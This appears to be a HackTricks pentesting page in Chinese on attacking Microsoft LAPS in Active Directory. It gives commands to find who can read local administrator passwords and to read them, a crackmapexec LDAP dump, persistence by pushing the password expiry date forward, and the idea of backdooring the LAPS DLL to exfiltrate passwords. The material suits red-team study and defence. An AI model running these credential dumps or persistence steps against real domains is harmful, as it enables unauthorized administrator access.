# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## 基本信息

**LAPS** 允许您在域加入的计算机上**管理本地管理员密码**（该密码是**随机的**、唯一的，并**定期更改**）。这些密码在 Active Directory 中进行集中存储，并使用 ACL 限制授权用户。密码在从客户端到服务器的传输过程中使用 Kerberos v5 和 AES 进行保护。

在使用 LAPS 时，域中的**计算机**对象中会出现**2个新属性**：**`ms-mcs-AdmPwd`** 和 **`ms-mcs-AdmPwdExpirationTime`**。这些属性包含**明文管理员密码和过期时间**。因此，在域环境中，检查**哪些用户可以读取**这些属性可能是有趣的。

### 检查是否已激活
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS密码访问

您可以从`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`下载原始LAPS策略，然后使用[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser)软件包中的**`Parse-PolFile`**将此文件转换为人类可读格式。

此外，如果安装在我们可以访问的计算机上，可以使用**本机LAPS PowerShell cmdlet**：
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** 也可以用来找出**谁可以读取密码并读取它**：
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 简化了对启用了 LAPS 的所有计算机进行枚举的过程。\
其中一个功能是解析**`ExtendedRights`**以获取**启用了 LAPS 的所有计算机**。这将显示专门**委派读取 LAPS 密码**的**组**，通常是受保护组中的用户。\
一个**加入计算机**到域的**帐户**会在该主机上获得`All Extended Rights`，这个权限赋予了**帐户**读取密码的能力。枚举可能会显示一个用户帐户可以在主机上读取 LAPS 密码。这可以帮助我们**针对特定的 AD 用户**，他们可以读取 LAPS 密码。
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **使用 Crackmapexec 转储 LAPS 密码**
如果没有访问 PowerShell 的权限，您可以通过 LDAP 远程滥用此特权。
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS持久性**

### **过期日期**

一旦成为管理员，可以通过**将过期日期设置为未来**来**获取密码**并**阻止**计算机**更新**密码，从而获得更好的立足点。
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
如果**管理员**使用**`Reset-AdmPwdPassword`**命令; 或者在LAPS GPO中启用了**不允许密码过期时间超过策略要求**，密码仍将被重置。
{% endhint %}

### 后门

LAPS的原始源代码可以在[这里](https://github.com/GreyCorbel/admpwd)找到，因此可以在代码中放置一个后门（例如在`Main/AdmPwd.PS/Main.cs`中的`Get-AdmPwdPassword`方法内），以某种方式**外泄新密码或将其存储在某处**。

然后，只需编译新的`AdmPwd.PS.dll`并将其上传到`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`中的机器（并更改修改时间）。
